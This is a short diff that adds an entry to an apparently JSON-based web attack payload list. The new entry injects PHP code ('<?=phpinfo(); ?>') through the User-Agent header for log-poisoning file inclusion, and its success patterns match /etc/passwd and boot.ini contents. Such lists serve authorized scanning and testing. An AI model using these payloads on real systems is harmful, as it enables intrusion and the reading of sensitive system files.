@@ -42,5 +42,16 @@
       "expected_status_code": 200,
       "success_regex": "root:.*:0:0|boot.ini"
     }
+  },
+  {
+    "payload_id": "OWP-237695",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "User-Agent: <?=phpinfo(); ?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
   }
 ]
